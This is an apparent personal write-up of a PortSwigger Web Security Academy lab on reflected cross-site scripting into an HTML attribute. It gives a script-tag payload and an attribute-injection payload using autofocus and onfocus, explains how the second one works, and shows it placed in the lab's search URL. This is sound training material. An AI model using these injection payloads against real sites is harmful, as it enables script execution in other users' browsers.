# Reflected XSS into attribute with angle brackets HTML-encoded

## This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

when

```javascript
"><script>alert(document.domain)</script>
```

not work then use

```javascript
" autofocus onfocus=alert(document.domain) x=";
```

The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup

---

### step 1

go to lab serach someting
eg test
`https://0acc00f30408c142c0c70891009600dd.web-security-academy.net/?search=test`

replace test with payload
`https://0acc00f30408c142c0c70891009600dd.web-security-academy.net/?search=" autofocus onfocus=alert(document.domain) x="`
